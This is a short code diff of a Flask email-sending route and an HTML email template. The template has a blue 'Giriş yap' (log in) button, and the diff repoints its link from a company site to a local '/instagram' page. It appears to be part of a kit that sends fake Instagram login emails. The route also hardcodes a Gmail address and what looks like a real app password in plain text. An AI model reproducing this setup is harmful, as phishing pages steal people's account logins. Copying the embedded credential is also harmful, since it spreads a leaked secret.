@@ -32,7 +32,7 @@ def send_email(sender, recipient, app_password, subject, content):
 
 @app.route('/send_email', methods=['POST'])
 def send_email_route():
-    try:
+    try:    
         data = request.get_json()
         sender_email = "xaetch@gmail.com"
         sender_app_password = "ltgh rovm xrrf mmiv"  
@@ -47,7 +47,7 @@ def send_email_route():
 
     <div
         style="display: flex; align-items:center; justify-content:center; margin-top: 40px; border-radius: 5px; background-color: #0095f6; font-weight: bold; text-align: center; width:200px;border: none;font-size: 14px;margin: 10px 0;">
-        <a href="http://www.firma-website.com"
+        <a href="http://localhost:3001/instagram"
             style="color: #ffffff; text-decoration: none; display: inline-block; padding: 5px 9px; border: none; width: 100%; font-size: 12px; cursor: pointer;">
             Giriş yap
         </a>
